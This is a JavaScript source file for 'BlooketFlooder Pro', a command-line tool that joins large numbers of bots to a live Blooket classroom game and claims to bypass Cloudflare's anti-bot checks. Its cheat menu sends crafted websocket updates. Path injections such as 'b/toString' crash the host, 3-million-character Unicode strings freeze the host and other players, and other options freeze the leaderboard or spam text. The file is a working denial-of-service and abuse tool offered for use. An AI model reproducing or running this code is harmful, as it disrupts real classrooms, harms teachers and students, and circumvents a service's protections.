import enquirer from 'enquirer';
import { bold, green, orange, purple, red, yellow } from '../common/color.js';
import cookieV2 from '../common/cookieV2.js';
import join from './join.js';
import readline from 'readline';

// Helper to get user input
function question(query) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise(resolve => rl.question(query, ans => {
        rl.close();
        resolve(ans);
    }));
}

console.log(bold(yellow('BlooketFlooder Pro')));

if (typeof Bun === 'undefined') {
    console.error(red('❌ this script requires bun (https://bun.sh) to bypass cloudflare antibot'));
    process.exit(1);
}

console.log(purple('✨ this is the formerly private version with:'));
console.log(purple('  - 100% cloudflare bypass (no popup windows)'));
console.log(purple('  - instant join'));
console.log(purple('  - 60-70% less resources used\n'));

if (!process.env.PROXY) console.log(orange('⚠️  use a proxy for faster botting! see the README for more info\n'));

try {
    const isOctober = new Date().getMonth() === 9;
    const isDecember = new Date().getMonth() === 11;
    const unrewritten = [isOctober ? 'Candy Quest' : 'Gold Quest', 'Crypto Hack', 'Fishing Frenzy'];
    if (isDecember) unrewritten.push('Santa\'s Workshop');

    const isUsingLegacy = await enquirer.prompt({
        type: 'select',
        name: 'is',
        message: `Is your gamemode one of ${unrewritten.join(', ')}?`,
        choices: ['yes', 'no']
    });

    if (isUsingLegacy.is.startsWith('y')) {
        // continue with legacy flow
    } else if (isUsingLegacy.is.startsWith('n')) {
        console.log('Beta mode not implemented in this file.');
        process.exit(0);
    } else {
        console.log('idrk what you just put so the program has quit run it again and type yes or no next time');
        process.exit(1);
    }

    const config = await enquirer.prompt([
        { type: 'input', name: 'pin', message: 'Game Pin' },
        { type: 'input', name: 'name', message: 'Bot Name' },
        { type: 'input', name: 'amount', message: 'Bot Amount' }
    ]);

    console.log(yellow('\nverifying game pin...'));

    const { redirectUrl } = await cookieV2('https://play.blooket.com/play?id=' + config.pin, 'legacy1');
    if (!redirectUrl) {
        console.log(red('Failed to verify game pin. Open an issue on Github if you believe this is an error.'));
        process.exit(1);
    }

    let mode = 'Unknown';
    for (const [key, value] of Object.entries({
        cryptohack: 'Crypto Hack',
        santasworkshop: 'Santa\'s Workshop',
        goldquest: 'Gold Quest',
        fishingfrenzy: 'Fishing Frenzy'
    })) {
        if (redirectUrl.includes(key)) {
            mode = value;
            break;
        }
    }

    console.log(green(`verified game pin! mode: ${mode}\n`));

    let success = 0;
    let fail = 0;
    const bots = [];

    for (let i = 1; i <= config.amount; i++) {
        join(redirectUrl, config.pin, config.name + i, (result, botObj) => {
            if (result == 2) {
                success++;
                bots.push(botObj);
            } else {
                fail++;
            }

            if (success + fail == config.amount) {
                console.log(green(`${success}/${config.amount} bots joined successfully!`));
                waitForGameStart(bots, mode);
            }
        });

        if (!process.env.PROXY) await new Promise((r) => setTimeout(r, 300));
    }

    async function waitForGameStart(bots, mode) {
        console.log(yellow('\n--- All bots are now in the lobby ---'));
        console.log(yellow('Please start the game on the host (click "Start Game" or equivalent).'));
        await question('Once the game has started, press Enter to continue to cheat selection...');
        await mainCheatLoop(bots, mode);
    }

    async function mainCheatLoop(bots, mode) {
        while (true) {
            console.log(yellow('\n--- Cheat Execution Menu ---'));
            const action = (await question('Do you want to (E)xecute a cheat or (Q)uit? (E/Q): ')).toLowerCase();
            if (action === 'q') {
                console.log(yellow('Exiting. Closing bot connections...'));
                for (const bot of bots) {
                    try { bot.ws.close(); } catch (e) { /* ignore */ }
                }
                process.exit(0);
            }

            if (action !== 'e') {
                console.log(red('Invalid choice. Please enter E or Q.'));
                continue;
            }

            // Define cheats (only include those that have been tested and work, plus diagnostic ones)
            const cheats = [
                {
                    name: 'Freeze Leaderboard',
                    description: 'Prevents the host leaderboard from updating',
                    action: async (bot) => {
                        console.log(`[${bot.name}] Sending freeze leaderboard...`);
                        return bot.sendUpdate(`c/${bot.name}/tat/Freeze`, 'freeze');
                    },
                    compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
                },
                {
                    name: 'Crash Game (original path)',
                    description: 'Crashes the host via b/toString',
                    action: async (bot) => {
                        console.log(`[${bot.name}] Sending crash via b/toString...`);
                        return bot.sendUpdate(`c/${bot.name}/b/toString`, 'Crashed');
                    },
                    compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
                },
                {
                    name: 'Crash Game (alternative)',
                    description: 'Crashes the host via b (direct blook)',
                    action: async (bot) => {
                        console.log(`[${bot.name}] Sending crash via b...`);
                        return bot.sendUpdate(`c/${bot.name}/b`, 'Crashed');
                    },
                    compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
                },
                {
                    name: 'Freeze Host (large blook)',
                    description: 'Sends extremely long blook name to freeze host',
                    action: async (bot) => {
                        console.log(`[${bot.name}] Generating long blook name (3M chars)...`);
                        const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
                        const unicodeChars = chars.map(c => eval(`"${c}"`));
                        const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
                        console.log(`[${bot.name}] Sending long text length: ${longText.length}`);
                        return bot.sendUpdate(`c/${bot.name}/b`, longText);
                    },
                    compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
                },
                {
                    name: 'Set Blook Ad Text',
                    description: 'Sets your blook to repeated text',
                    inputs: [{ name: 'text', prompt: 'Enter text to repeat: ' }],
                    action: async (bot, { text }) => {
                        const repeated = Array(500).fill(text).join(' ');
                        console.log(`[${bot.name}] Sending ad text (length: ${repeated.length})...`);
                        return bot.sendUpdate(`c/${bot.name}/b`, repeated);
                    },
                    compatible: ['Crypto Hack', 'Gold Quest', 'Fishing Frenzy', 'Santa\'s Workshop']
                },
                {
                    name: 'Set Host Screen Green (Crypto Hack)',
                    description: 'Fills host screen with text',
                    action: async (bot) => {
                        const value = `9999999999999999999999999999999999999999999999${new Array(999).fill('\u0e47'.repeat(70)).join(' ')}`;
                        console.log(`[${bot.name}] Sending host screen green (length: ${value.length})...`);
                        return bot.sendUpdate(`c/${bot.name}/cr`, value);
                    },
                    compatible: ['Crypto Hack']
                },
                {
                    name: 'Crash Password (Crypto Hack)',
                    description: 'Crashes players who try to hack you',
                    action: async (bot) => {
                        console.log(`[${bot.name}] Sending crash password...`);
                        return bot.sendUpdate(`c/${bot.name}/p/toString`, 'crash');
                    },
                    compatible: ['Crypto Hack']
                },
                {
                    name: 'Freeze Password (Crypto Hack)',
                    description: 'Freezes players who try to hack you',
                    action: async (bot) => {
                        console.log(`[${bot.name}] Sending freeze password...`);
                        const chars = ['\\u2f9f', '\\u4fff', '\\u4f52', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u0E47', '\\u4FF1', '\\u4FF2'];
                        const unicodeChars = chars.map(c => eval(`"${c}"`));
                        const longText = new Array(3000000).fill().map(() => unicodeChars[Math.floor(Math.random() * unicodeChars.length)]).join('');
                        return bot.sendUpdate(`c/${bot.name}/p`, longText);
                    },
                    compatible: ['Crypto Hack']
                }
            ];

            // Filter cheats compatible with current mode
            const availableCheats = cheats.filter(c => c.compatible.includes(mode));
            if (availableCheats.length === 0) {
                console.log(red(`No cheats available for mode: ${mode}`));
                return;
            }

            // Show cheat list with numbers
            console.log(yellow('\nAvailable cheats:'));
            for (let i = 0; i < availableCheats.length; i++) {
                console.log(`${i + 1}. ${availableCheats[i].name} - ${availableCheats[i].description}`);
            }

            // Select cheat by number
            let cheatIndex;
            while (true) {
                const ans = await question('Select a cheat (number): ');
                const num = parseInt(ans.trim(), 10);
                if (!isNaN(num) && num >= 1 && num <= availableCheats.length) {
                    cheatIndex = num - 1;
                    break;
                }
                console.log(red('Invalid number. Try again.'));
            }
            const selectedCheat = availableCheats[cheatIndex];

            // Collect any required parameters
            let params = {};
            if (selectedCheat.inputs) {
                for (const inp of selectedCheat.inputs) {
                    const val = await question(inp.prompt);
                    params[inp.name] = val;
                }
            }

            // Choose bot
            console.log(yellow('\nBots:'));
            bots.forEach((bot, idx) => console.log(`${idx + 1}. ${bot.name}`));
            let botIndex;
            while (true) {
                const ans = await question('Select a bot (number): ');
                const num = parseInt(ans.trim(), 10);
                if (!isNaN(num) && num >= 1 && num <= bots.length) {
                    botIndex = num - 1;
                    break;
                }
                console.log(red('Invalid bot number. Try again.'));
            }
            const selectedBot = bots[botIndex];

            // Execute cheat
            console.log(yellow(`\nExecuting ${selectedCheat.name} on ${selectedBot.name}...`));
            try {
                await selectedCheat.action(selectedBot, params);
                console.log(green('Cheat executed successfully!'));
            } catch (err) {
                console.log(red(`Cheat execution failed: ${err.message}`));
                console.error(err);
            }

            // Wait a moment before returning to menu
            console.log(yellow('Waiting 2 seconds before returning to menu...'));
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    }
} catch (error) {
    console.error(red('An unexpected error occurred:'), error);
    process.exit(1);
}
